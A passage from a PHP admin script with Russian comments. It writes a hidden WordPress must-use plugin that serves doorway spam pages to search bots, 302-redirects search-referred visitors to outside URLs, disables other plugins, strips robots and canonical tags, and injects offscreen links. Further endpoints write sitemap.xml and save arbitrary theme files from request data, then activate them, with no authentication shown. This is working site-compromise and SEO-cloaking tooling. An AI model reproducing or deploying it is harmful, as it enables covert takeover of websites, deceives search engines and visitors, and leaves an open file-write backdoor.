            $wpLinksContent .= "                if (stripos(\$userAgent, \$bot) !== false) {\n";
            $wpLinksContent .= "                    \$isBot = true;\n";
            $wpLinksContent .= "                    break;\n";
            $wpLinksContent .= "                }\n";
            $wpLinksContent .= "            }\n";
            $wpLinksContent .= "            // Если клоакинг включен и это НЕ бот - показываем обычный WP\n";
            $wpLinksContent .= "            if (\$cloakingMode && !\$isBot) {\n";
            $wpLinksContent .= "                return; // Пускаем в WordPress\n";
            $wpLinksContent .= "            }\n    \n";
            $wpLinksContent .= "            status_header(200);\n";
            $wpLinksContent .= "            global \$wp_query;\n";
            $wpLinksContent .= "            \$wp_query->is_404 = false;\n";
            $wpLinksContent .= "            \$wp_query->is_home = true;\n";
            $wpLinksContent .= "            \$wp_query->is_front_page = true;\n    \n";
            $wpLinksContent .= "            \$homeContent = file_get_contents(\$indexFile);\n    \n";
            $wpLinksContent .= "            // Извлекаем метатеги\n";
            $wpLinksContent .= "            \$metaTags = '';\n";
            $wpLinksContent .= "            \$bodyContent = \$homeContent;\n";
            $wpLinksContent .= "            if (preg_match('/(<!-- META_START -->.*?<!-- META_END -->)/s', \$homeContent, \$metaMatch)) {\n";
            $wpLinksContent .= "                \$metaTags = \$metaMatch[1];\n";
            $wpLinksContent .= "                \$bodyContent = str_replace(\$metaMatch[0], '', \$homeContent);\n";
            $wpLinksContent .= "                // Удаляем маркеры из метатегов\n";
            $wpLinksContent .= "                \$metaTags = str_replace(['<!-- META_START -->', '<!-- META_END -->'], '', \$metaTags);\n";
            $wpLinksContent .= "            }\n    \n";
            $wpLinksContent .= "            // Устанавливаем title\n";
            $wpLinksContent .= "            preg_match('/<title>(.*?)<\\/title>/i', \$homeContent, \$titleMatch);\n";
            $wpLinksContent .= "            \$pageTitle = \$titleMatch[1] ?? 'Блог | ' . \$siteBrand;\n    \n";
            $wpLinksContent .= "            add_filter('pre_get_document_title', function() use (\$pageTitle) {\n";
            $wpLinksContent .= "                return \$pageTitle;\n";
            $wpLinksContent .= "            }, 999);\n    \n";
            $wpLinksContent .= "            // Загружаем список статей\n";
            $wpLinksContent .= "            \$allLinks = " . $linksCode . "\n    \n";
            $wpLinksContent .= "            ob_start();\n";
            $wpLinksContent .= "            get_header();\n";
            $wpLinksContent .= "            echo '<div class=\"content-post\">';\n";
            $wpLinksContent .= "            echo \$bodyContent;\n";
            $wpLinksContent .= "            echo '</div>';\n    \n";
            $wpLinksContent .= "            // СПИСОК СТАТЕЙ ДО GET_FOOTER!\n";
            $wpLinksContent .= "            echo '<div style=\"margin: 40px 0; padding: 30px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);\">';\n";
            $wpLinksContent .= "            echo '<h2 style=\"margin-bottom: 20px; font-size: 24px; color: #333;\">Наши статьи:</h2>';\n";
            $wpLinksContent .= "            echo '<div style=\"display: grid; gap: 15px;\">';\n";
            $wpLinksContent .= "            foreach (\$allLinks as \$link) {\n";
            $wpLinksContent .= "                echo '<div style=\"padding: 15px; background: #f8f9fa; border-radius: 5px; border-left: 3px solid #007bff;\">';\n";
            $wpLinksContent .= "                echo '<a href=\"' . esc_url(\$link['url']) . '\" style=\"color: #007bff; text-decoration: none; font-size: 16px; font-weight: 500;\">' . esc_html(\$link['title']) . '</a>';\n";
            $wpLinksContent .= "                echo '</div>';\n";
            $wpLinksContent .= "            }\n";
            $wpLinksContent .= "            echo '</div></div>';\n    \n";
            $wpLinksContent .= "            get_footer();\n";
            $wpLinksContent .= "            \$fullPage = ob_get_clean();\n    \n";
            $wpLinksContent .= "            // Удаляем дубликаты title\n";
            $wpLinksContent .= "            \$fullPage = preg_replace('/<title>.*?<\\/title>/i', '', \$fullPage, 1);\n";
            $wpLinksContent .= "            // Добавляем метатеги перед </head>\n";
            $wpLinksContent .= "            \$fullPage = str_replace('</head>', \$metaTags . \"\\n</head>\", \$fullPage);\n    \n";
            
            // Замена lang на ru (если включено) для главной страницы
            if ($forceLangRu) {
                $wpLinksContent .= "            // Замена языка на ru\n";
                $wpLinksContent .= "            \$fullPage = preg_replace('/<html[^>]*lang=[\"\\'][^\"\\']*[\"\\'][^>]*>/i', '<html lang=\"ru\">', \$fullPage);\n    \n";
            }
            
            $wpLinksContent .= "            echo \$fullPage;\n";
            $wpLinksContent .= "            exit;\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "    }\n    \n";
        }
        
        $wpLinksContent .= "    \n";
        $wpLinksContent .= "    // Найти redirect_url для текущего дорвея\n";
        $wpLinksContent .= "    \$currentDoorway = null;\n";
        $wpLinksContent .= "    foreach (\$doorwaysConfig as \$doorway) {\n";
        $wpLinksContent .= "        if (\$doorway['slug'] === \$requestUri) {\n";
        $wpLinksContent .= "            \$currentDoorway = \$doorway;\n";
        $wpLinksContent .= "            break;\n";
        $wpLinksContent .= "        }\n";
        $wpLinksContent .= "    }\n    \n";
        $wpLinksContent .= "    // Если это не дорвей - выходим\n";
        $wpLinksContent .= "    if (!\$currentDoorway) {\n";
        $wpLinksContent .= "        return;\n";
        $wpLinksContent .= "    }\n    \n";
        
        // ⭐ КРИТИЧЕСКИЙ БЛОК - НАСИЛЬНО!
        $wpLinksContent .= "    // ⭐ КРИТИЧЕСКОЕ: HTTP 200 и отключение 404\n";
        $wpLinksContent .= "    status_header(200);\n";
        $wpLinksContent .= "    header('HTTP/1.1 200 OK');\n";
        $wpLinksContent .= "    header('Content-Type: text/html; charset=UTF-8');\n";
        $wpLinksContent .= "    header('Cache-Control: public, max-age=3600');\n";
        $wpLinksContent .= "    header_remove('X-Redirect-By');\n    \n";
        $wpLinksContent .= "    global \$wp_query;\n";
        $wpLinksContent .= "    \$wp_query->is_404 = false;\n";
        $wpLinksContent .= "    \$wp_query->is_page = true;\n";
        $wpLinksContent .= "    \$wp_query->is_singular = true;\n";
        $wpLinksContent .= "    \$wp_query->is_home = false;\n";
        $wpLinksContent .= "    \$wp_query->is_archive = false;\n    \n";
        $wpLinksContent .= "    add_filter('body_class', function(\$classes) {\n";
        $wpLinksContent .= "        return array_diff(\$classes, ['error404']);\n";
        $wpLinksContent .= "    }, 999);\n    \n";
        
        $wpLinksContent .= "    \$uploadsDir = WP_CONTENT_DIR . '/uploads/2025';\n";
        $wpLinksContent .= "    // Убираем blog/ из slug для поиска файла\n";
        $wpLinksContent .= "    \$fileSlug = str_replace('blog/', '', \$currentDoorway['slug']);\n";
        $wpLinksContent .= "    \$htmlFile = \$uploadsDir . '/' . \$fileSlug . '.html';\n    \n";
        $wpLinksContent .= "    if (!file_exists(\$htmlFile)) {\n";
        $wpLinksContent .= "        return;\n";
        $wpLinksContent .= "    }\n    \n";
        $wpLinksContent .= "    // Определение User Agent (боты)\n";
        $wpLinksContent .= "    \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';\n";
        $wpLinksContent .= "    \$bots = ['googlebot', 'Googlebot-Image', 'Googlebot-Video', 'Googlebot-News',\n";
        $wpLinksContent .= "             'Storebot-Google', 'Google-InspectionTool', 'GoogleOther',\n";
        $wpLinksContent .= "             'bingbot', 'bingpreview', 'msnbot', 'duckduckbot', 'AdldxBot', 'yandex', 'YandexBot'];\n    \n";
        $wpLinksContent .= "    \$isBot = false;\n";
        $wpLinksContent .= "    foreach (\$bots as \$bot) {\n";
        $wpLinksContent .= "        if (stripos(\$userAgent, \$bot) !== false) {\n";
        $wpLinksContent .= "            \$isBot = true;\n";
        $wpLinksContent .= "            break;\n";
        $wpLinksContent .= "        }\n";
        $wpLinksContent .= "    }\n    \n";
        $wpLinksContent .= "    // Определение источника (referrer)\n";
        $wpLinksContent .= "    \$referer = \$_SERVER['HTTP_REFERER'] ?? '';\n";
        $wpLinksContent .= "    \$fromGoogle = preg_match('/google\\./i', \$referer);\n";
        $wpLinksContent .= "    \$fromYandex = preg_match('/yandex\\./i', \$referer);\n";
        $wpLinksContent .= "    \$fromBing = preg_match('/bing\\.com/i', \$referer);\n";
        $wpLinksContent .= "    \$fromDuckDuckGo = preg_match('/duckduckgo\\.com/i', \$referer);\n    \n";
        
        // Добавляем настройки редиректа PHP переменными
        $wpLinksContent .= "    // Настройки редиректа\n";
        $wpLinksContent .= "    \$redirectYandex = " . ($redirectYandex ? 'true' : 'false') . ";\n";
        $wpLinksContent .= "    \$redirectBing = " . ($redirectBing ? 'true' : 'false') . ";\n";
        $wpLinksContent .= "    \$redirectGoogleRuOnly = " . ($redirectGoogleRuOnly ? 'true' : 'false') . ";\n    \n";
        
        $wpLinksContent .= "    // Проверка языка для Google (только RU)\n";
        $wpLinksContent .= "    \$acceptLang = \$_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';\n";
        $wpLinksContent .= "    \$isRussianUser = preg_match('/ru/i', \$acceptLang);\n    \n";
        
        $wpLinksContent .= "    // Логика редиректа с учетом настроек\n";
        $wpLinksContent .= "    if (\$fromGoogle) {\n";
        $wpLinksContent .= "        // Google: проверяем настройку \"только RU\"\n";
        $wpLinksContent .= "        if (\$redirectGoogleRuOnly) {\n";
        $wpLinksContent .= "            // Редирект только для русскоязычных\n";
        $wpLinksContent .= "            if (\$isRussianUser) {\n";
        $wpLinksContent .= "                wp_redirect(\$currentDoorway['redirect_url'], 302);\n";
        $wpLinksContent .= "                exit;\n";
        $wpLinksContent .= "            }\n";
        $wpLinksContent .= "        } else {\n";
        $wpLinksContent .= "            // Редирект для всех\n";
        $wpLinksContent .= "            wp_redirect(\$currentDoorway['redirect_url'], 302);\n";
        $wpLinksContent .= "            exit;\n";
        $wpLinksContent .= "        }\n";
        $wpLinksContent .= "    } elseif (\$fromYandex && \$redirectYandex) {\n";
        $wpLinksContent .= "        // Яндекс: редирект если включено\n";
        $wpLinksContent .= "        wp_redirect(\$currentDoorway['redirect_url'], 302);\n";
        $wpLinksContent .= "        exit;\n";
        $wpLinksContent .= "    } elseif (\$fromBing && \$redirectBing) {\n";
        $wpLinksContent .= "        // Bing: редирект если включено\n";
        $wpLinksContent .= "        wp_redirect(\$currentDoorway['redirect_url'], 302);\n";
        $wpLinksContent .= "        exit;\n";
        $wpLinksContent .= "    } elseif (\$fromDuckDuckGo) {\n";
        $wpLinksContent .= "        // DuckDuckGo: всегда редирект\n";
        $wpLinksContent .= "        wp_redirect(\$currentDoorway['redirect_url'], 302);\n";
        $wpLinksContent .= "        exit;\n";
        $wpLinksContent .= "    }\n    \n";
        $wpLinksContent .= "    // Всем остальным (боты, Bing, прямые заходы) → показать дорвей\n    \n";
        $wpLinksContent .= "    // ОТКЛЮЧЕНИЕ ВСЕХ ПЛАГИНОВ для дорвеев\n";
        $wpLinksContent .= "    add_filter('option_active_plugins', function() { return array(); }, 999);\n";
        $wpLinksContent .= "    add_filter('site_option_active_sitewide_plugins', function() { return array(); }, 999);\n    \n";
        $wpLinksContent .= "    // Отключаем Yoast SEO специально\n";
        $wpLinksContent .= "    add_filter('wpseo_json_ld_output', '__return_false', 999);\n";
        $wpLinksContent .= "    add_filter('wpseo_schema_graph', '__return_empty_array', 999);\n";
        $wpLinksContent .= "    add_filter('wpseo_frontend_presenters', '__return_empty_array', 999);\n    \n";
        $wpLinksContent .= "    \$content = file_get_contents(\$htmlFile);\n    \n";
        $wpLinksContent .= "    // Извлечение title из HTML\n";
        $wpLinksContent .= "    preg_match('/<title>(.*?)<\\/title>/i', \$content, \$titleMatch);\n";
        $wpLinksContent .= "    \$pageTitle = \$titleMatch[1] ?? 'Article';\n    \n";
        $wpLinksContent .= "    // Установка title\n";
        $wpLinksContent .= "    add_filter('pre_get_document_title', function() use (\$pageTitle) {\n";
        $wpLinksContent .= "        return \$pageTitle;\n";
        $wpLinksContent .= "    }, 999);\n    \n";
        $wpLinksContent .= "    add_filter('document_title_parts', function(\$title) use (\$pageTitle) {\n";
        $wpLinksContent .= "        return array('title' => \$pageTitle);\n";
        $wpLinksContent .= "    }, 999);\n    \n";
        $wpLinksContent .= "    // Извлекаем метатеги из контента\n";
        $wpLinksContent .= "    \$metaTags = '';\n";
        $wpLinksContent .= "    \$bodyContent = \$content;\n    \n";
        $wpLinksContent .= "    if (preg_match('/(<!-- META_START -->.*?<!-- META_END -->)/s', \$content, \$metaMatch)) {\n";
        $wpLinksContent .= "        \$metaTags = \$metaMatch[1];\n";
        $wpLinksContent .= "        \$bodyContent = str_replace(\$metaMatch[0], '', \$content);\n";
        $wpLinksContent .= "        // Удаляем маркеры из метатегов\n";
        $wpLinksContent .= "        \$metaTags = str_replace(['<!-- META_START -->', '<!-- META_END -->'], '', \$metaTags);\n";
        $wpLinksContent .= "    }\n    \n";
        $wpLinksContent .= "    // Буферизация ВСЕГО вывода страницы\n";
        $wpLinksContent .= "    ob_start();\n    \n";
        $wpLinksContent .= "    get_header();\n    \n";
        $wpLinksContent .= "    echo '<div class=\"content-post\">';\n";
        $wpLinksContent .= "    echo \$bodyContent;\n";
        $wpLinksContent .= "    echo '</div>';\n    \n";
        $wpLinksContent .= "    get_footer();\n    \n";
        $wpLinksContent .= "    \$fullPage = ob_get_clean();\n    \n";
        $wpLinksContent .= "    // Удаляем ВСЕ meta robots теги\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<meta\\s+name=[\"\\']robots[\"\\']\\s+content=[\"\\'][^\"\\']* [\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<meta\\s+property=[\"\\']robots[\"\\']\\s+content=[\"\\'][^\"\\']*[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем ВСЕ og:title теги (включая \"Page not found\")\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<meta\\s+property=[\"\\']og:title[\"\\']\\s+content=[\"\\'][^\"\\']*[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем все WordPress canonical (оставляем только наш!)\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<link\\s+rel=[\"\\']canonical[\"\\']\\s+href=[\"\\']https?:\\/\\/[^\"\\']*index\\.php[^\"\\']*[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем все RSS/Atom feeds\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<link\\s+rel=[\"\\']alternate[\"\\'][^>]*type=[\"\\']application\\/(rss|atom)\\+xml[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем oEmbed\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<link\\s+rel=[\"\\']alternate[\"\\'][^>]*oembed[^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем shortlink\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<link\\s+rel=[\"\\']shortlink[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем EditURI/RSD\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<link\\s+rel=[\"\\']EditURI[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем pingback\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<meta\\s+name=[\"\\']pingback[\"\\'][^>]*\\s*\\/?>/i', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Удаляем дубликаты title (оставляем только из метатегов)\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<title>.*?<\\/title>/i', '', \$fullPage, 1);\n    \n";
        $wpLinksContent .= "    // Удаляем все Schema.org (оставляем только из метатегов)\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<script[^>]*type=[\"\\']?application\\/ld\\+json[\"\\']?[^>]*>.*?<\\/script>/is', '', \$fullPage);\n";
        $wpLinksContent .= "    // Удаляем Yoast Schema.org специально (если осталось)\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<script[^>]*class=[\"\\']?yoast-schema-graph[\"\\']?[^>]*>.*?<\\/script>/is', '', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Очищаем атрибуты body тега (убираем error404, wp-custom-logo и т.д.)\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<body[^>]*class=\"[^\"]*error404[^\"]*\"[^>]*>/i', '<body>', \$fullPage);\n";
        $wpLinksContent .= "    \$fullPage = preg_replace('/<body[^>]*>/i', '<body>', \$fullPage);\n    \n";
        $wpLinksContent .= "    // Добавляем ОДИН правильный meta robots + метатеги перед </head>\n";
        $wpLinksContent .= "    \$headInsertion = '<meta name=\"robots\" content=\"index, follow\">' . \"\\n\" . \$metaTags;\n";
        $wpLinksContent .= "    \$fullPage = str_replace('</head>', \$headInsertion . \"\\n</head>\", \$fullPage);\n    \n";
        
        // Замена lang на ru (если включено)
        if ($forceLangRu) {
            $wpLinksContent .= "    // Замена языка на ru\n";
            $wpLinksContent .= "    \$fullPage = preg_replace('/<html[^>]*lang=[\"\\'][^\"\\']*[\"\\'][^>]*>/i', '<html lang=\"ru\">', \$fullPage);\n    \n";
        }
        
        $wpLinksContent .= "    echo \$fullPage;\n";
        $wpLinksContent .= "    exit;\n";
        $wpLinksContent .= "}, 1);\n\n";
        
        // Internal links секция - РАЗНЫЕ РЕЖИМЫ
        $wpLinksContent .= "// Режим перелинковки: {$linkingMode}\n";
        $wpLinksContent .= "// 1=hidden, 2=/blog/, 3=homepage\n\n";
        
        if ($linkingMode == 1) {
            // РЕЖИМ 1: Скрытые ссылки (как раньше)
            $wpLinksContent .= "// Internal links в футере (скрытые)\n";
            $wpLinksContent .= "add_action('wp_footer', function() {\n";
            $wpLinksContent .= "    " . $linksCode . "\n    \n";
            $wpLinksContent .= "    if (empty(\$internalLinks)) {\n";
            $wpLinksContent .= "        return;\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    echo '<div style=\"position:absolute;left:{$randomLeft}px;width:{$randomWidth}px;\">';\n";
            $wpLinksContent .= "    echo 'Читайте далее:<br>';\n    \n";
            $wpLinksContent .= "    foreach (\$internalLinks as \$link) {\n";
            $wpLinksContent .= "        echo '<a href=\"' . esc_url(\$link['url']) . '\">' . esc_html(\$link['title']) . '</a><br>';\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    echo '</div>';\n";
            $wpLinksContent .= "}, 999);\n";
        } elseif ($linkingMode == 2) {
            // РЕЖИМ 2: /blog/ страница с видимыми ссылками НАД футером
            $wpLinksContent .= "// Видимые ссылки на дорвеях НАД футером + скрытые на /blog/\n";
            $wpLinksContent .= "add_action('get_footer', function() {\n";
            $wpLinksContent .= "    " . $linksCode . "\n    \n";
            $wpLinksContent .= "    if (empty(\$internalLinks)) {\n";
            $wpLinksContent .= "        return;\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    \$currentUri = trim(\$_SERVER['REQUEST_URI'], '/');\n";
            $wpLinksContent .= "    \$currentUri = strtok(\$currentUri, '?');\n    \n";
            $wpLinksContent .= "    // Находим текущую страницу и prev/next\n";
            $wpLinksContent .= "    \$currentIndex = -1;\n";
            $wpLinksContent .= "    \$links = array_values(\$internalLinks);\n";
            $wpLinksContent .= "    foreach (\$links as \$idx => \$link) {\n";
            $wpLinksContent .= "        if (trim(\$link['slug'], '/') === \$currentUri) {\n";
            $wpLinksContent .= "            \$currentIndex = \$idx;\n";
            $wpLinksContent .= "            break;\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    if (\$currentIndex >= 0) {\n";
            $wpLinksContent .= "        // Это дорвей - показываем навигацию\n";
            $wpLinksContent .= "        echo '<div style=\"margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 8px;\">';\n";
            $wpLinksContent .= "        echo '<div style=\"margin-bottom: 15px;\"><a href=\"/blog/\" style=\"color: #007bff; text-decoration: none; font-weight: bold;\">← К блогу</a></div>';\n";
            $wpLinksContent .= "        echo '<div style=\"display: flex; justify-content: space-between;\">';\n";
            $wpLinksContent .= "        if (\$currentIndex > 0) {\n";
            $wpLinksContent .= "            \$prev = \$links[\$currentIndex - 1];\n";
            $wpLinksContent .= "            echo '<a href=\"' . esc_url(\$prev['url']) . '\" style=\"color: #007bff; text-decoration: none;\">← ' . esc_html(\$prev['title']) . '</a>';\n";
            $wpLinksContent .= "        } else {\n";
            $wpLinksContent .= "            echo '<span></span>';\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "        if (\$currentIndex < count(\$links) - 1) {\n";
            $wpLinksContent .= "            \$next = \$links[\$currentIndex + 1];\n";
            $wpLinksContent .= "            echo '<a href=\"' . esc_url(\$next['url']) . '\" style=\"color: #007bff; text-decoration: none;\">' . esc_html(\$next['title']) . ' →</a>';\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "        echo '</div></div>';\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "}, 5);\n";
            $wpLinksContent .= "\n// Скрытая ссылка на /blog/ в футере\n";
            $wpLinksContent .= "add_action('wp_footer', function() {\n";
            $wpLinksContent .= "    echo '<div style=\"position:absolute;left:-9999px;\"><a href=\"/blog/\">Блог</a></div>';\n";
            $wpLinksContent .= "}, 999);\n";
        } elseif ($linkingMode == 3) {
            // РЕЖИМ 3: Главная как блог - видимые prev/next навигация НАД футером!
            $wpLinksContent .= "// Видимые prev/next навигация НАД футером (режим homepage)\n";
            $wpLinksContent .= "add_action('get_footer', function() {\n";
            $wpLinksContent .= "    " . $linksCode . "\n    \n";
            $wpLinksContent .= "    if (empty(\$internalLinks)) {\n";
            $wpLinksContent .= "        return;\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    \$currentUri = trim(\$_SERVER['REQUEST_URI'], '/');\n";
            $wpLinksContent .= "    \$currentUri = strtok(\$currentUri, '?');\n";
            $wpLinksContent .= "    \$currentUri = str_replace('index.php/', '', \$currentUri);\n    \n";
            $wpLinksContent .= "    // Находим текущую страницу\n";
            $wpLinksContent .= "    \$currentIndex = -1;\n";
            $wpLinksContent .= "    \$links = array_values(\$internalLinks);\n";
            $wpLinksContent .= "    foreach (\$links as \$idx => \$link) {\n";
            $wpLinksContent .= "        if (trim(\$link['slug'], '/') === \$currentUri) {\n";
            $wpLinksContent .= "            \$currentIndex = \$idx;\n";
            $wpLinksContent .= "            break;\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "    }\n    \n";
            $wpLinksContent .= "    if (\$currentIndex >= 0) {\n";
            $wpLinksContent .= "        // Дорвей - показываем навигацию НАД футером\n";
            $wpLinksContent .= "        echo '<div style=\"margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 8px;\">';\n";
            $wpLinksContent .= "        echo '<div style=\"margin-bottom: 15px;\"><a href=\"/\" style=\"color: #007bff; text-decoration: none; font-weight: bold;\">← На главную</a></div>';\n";
            $wpLinksContent .= "        echo '<div style=\"display: flex; justify-content: space-between;\">';\n";
            $wpLinksContent .= "        if (\$currentIndex > 0) {\n";
            $wpLinksContent .= "            \$prev = \$links[\$currentIndex - 1];\n";
            $wpLinksContent .= "            echo '<a href=\"' . esc_url(\$prev['url']) . '\" style=\"color: #007bff; text-decoration: none;\">← ' . esc_html(\$prev['title']) . '</a>';\n";
            $wpLinksContent .= "        } else {\n";
            $wpLinksContent .= "            echo '<span></span>';\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "        if (\$currentIndex < count(\$links) - 1) {\n";
            $wpLinksContent .= "            \$next = \$links[\$currentIndex + 1];\n";
            $wpLinksContent .= "            echo '<a href=\"' . esc_url(\$next['url']) . '\" style=\"color: #007bff; text-decoration: none;\">' . esc_html(\$next['title']) . ' →</a>';\n";
            $wpLinksContent .= "        }\n";
            $wpLinksContent .= "        echo '</div></div>';\n";
            $wpLinksContent .= "    }\n";
            $wpLinksContent .= "}, 5);\n";
        }
        
        // Сохранение wp-links.php в mu-plugins
        $muDir = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/mu-plugins';
        if (!is_dir($muDir)) {
            mkdir($muDir, 0755, true);
        }
        
        $wpLinksFile = $muDir . '/wp-links.php';
        file_put_contents($wpLinksFile, $wpLinksContent);
        
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'file' => $wpLinksFile,
            'links_count' => count($internalLinks)
        ]);
        exit;
    
    // Создать sitemap.xml
    case 'create_sitemap':
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        if (!$data || !isset($data['doorways'])) {
            header('Content-Type: application/json');
            echo json_encode(['success' => false, 'error' => 'Invalid data']);
            exit;
        }
        
        $doorways = $data['doorways'];
        $linkingMode = $data['linking_mode'] ?? 1;
        
        $siteUrl = 'https://' . $_SERVER['HTTP_HOST'];
        $currentDate = date('Y-m-d');
        
        $xml = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
        
        // Приоритеты в зависимости от режима
        if ($linkingMode == 3) {
            // Режим 3: Главная = 1.0, дорвеи = 0.8
            $xml .= "  <url>\n";
            $xml .= "    <loc>{$siteUrl}/</loc>\n";
            $xml .= "    <lastmod>{$currentDate}</lastmod>\n";
            $xml .= "    <priority>1.0</priority>\n";
            $xml .= "  </url>\n";
            
            foreach ($doorways as $doorway) {
                $url = $siteUrl . '/' . $doorway['slug'];
                $xml .= "  <url>\n";
                $xml .= "    <loc>{$url}</loc>\n";
                $xml .= "    <lastmod>{$currentDate}</lastmod>\n";
                $xml .= "    <priority>0.8</priority>\n";
                $xml .= "  </url>\n";
            }
        } elseif ($linkingMode == 2) {
            // Режим 2: /blog/ = 0.8, дорвеи = 0.3
            $xml .= "  <url>\n";
            $xml .= "    <loc>{$siteUrl}/blog/</loc>\n";
            $xml .= "    <lastmod>{$currentDate}</lastmod>\n";
            $xml .= "    <priority>0.8</priority>\n";
            $xml .= "  </url>\n";
            
            foreach ($doorways as $doorway) {
                $url = $siteUrl . '/' . $doorway['slug'];
                $xml .= "  <url>\n";
                $xml .= "    <loc>{$url}</loc>\n";
                $xml .= "    <lastmod>{$currentDate}</lastmod>\n";
                $xml .= "    <priority>0.3</priority>\n";
                $xml .= "  </url>\n";
            }
        } else {
            // Режим 1: Дорвеи = 0.8
            foreach ($doorways as $doorway) {
                $url = $siteUrl . '/' . $doorway['slug'];
                $xml .= "  <url>\n";
                $xml .= "    <loc>{$url}</loc>\n";
                $xml .= "    <lastmod>{$currentDate}</lastmod>\n";
                $xml .= "    <priority>0.8</priority>\n";
                $xml .= "  </url>\n";
            }
        }
        
        $xml .= '</urlset>';
        
        $sitemapFile = $_SERVER['DOCUMENT_ROOT'] . '/sitemap.xml';
        file_put_contents($sitemapFile, $xml);
        
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'file' => $sitemapFile,
            'urls_count' => count($doorways) + ($linkingMode == 3 ? 1 : ($linkingMode == 2 ? 1 : 0))
        ]);
        exit;
    
    // Активировать WordPress тему
    case 'activate_wp_theme':
        try {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!$data || !isset($data['theme_name'])) {
                header('Content-Type: application/json');
                echo json_encode(['success' => false, 'error' => 'Theme name required']);
                exit;
            }
            
            $themeName = $data['theme_name'];
            
            // Загружаем WordPress
            $wpLoad = $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';
            if (!file_exists($wpLoad)) {
                throw new Exception('WordPress not found: ' . $wpLoad);
            }
            
            require_once($wpLoad);
            
            // Активируем тему через WordPress
            update_option('template', $themeName);
            update_option('stylesheet', $themeName);
            
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'theme_name' => $themeName,
                'message' => 'Theme activated successfully'
            ]);
            
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'error' => $e->getMessage()
            ]);
        }
        exit;
    
    // Создать WordPress тему
    case 'create_wp_theme':
        try {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!$data || !isset($data['theme_name']) || !isset($data['files'])) {
                header('Content-Type: application/json');
                echo json_encode(['success' => false, 'error' => 'Invalid data']);
                exit;
            }
            
            $themeName = $data['theme_name'];
            $files = $data['files'];
            $autoActivate = $data['auto_activate'] ?? false;
            
            // Папка темы
            $themesDir = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/themes';
            $themeDir = $themesDir . '/' . $themeName;
            
            // Создаем директории
            if (!is_dir($themesDir)) {
                mkdir($themesDir, 0755, true);
            }
            
            if (!is_dir($themeDir)) {
                mkdir($themeDir, 0755, true);
            }
            
            // Создаем поддиректории
            $cssDir = $themeDir . '/css';
            $jsDir = $themeDir . '/js';
            
            if (!is_dir($cssDir)) {
                mkdir($cssDir, 0755, true);
            }
            
            if (!is_dir($jsDir)) {
                mkdir($jsDir, 0755, true);
            }
            
            // Записываем файлы
            $createdFiles = [];
            
            foreach ($files as $filename => $content) {
                $filepath = $themeDir . '/' . $filename;
                
                // Создаем поддиректорию если нужно
                $dir = dirname($filepath);
                if (!is_dir($dir)) {
                    mkdir($dir, 0755, true);
                }
                
                file_put_contents($filepath, $content);
                chmod($filepath, 0644);
                $createdFiles[] = $filename;
            }
            
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'theme_path' => $themeDir,
                'files_created' => count($createdFiles),
                'files' => $createdFiles
            ]);
            
        } catch (Exception $e) {
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'error' => $e->getMessage()
            ]);
        }
        exit;
    
    // Создать indexnow.php
    case 'create_indexnow':
        try {
            $input = file_get_contents('php://input');
            $data = json_decode($input, true);
            
            if (!$data || !isset($data['doorways'])) {
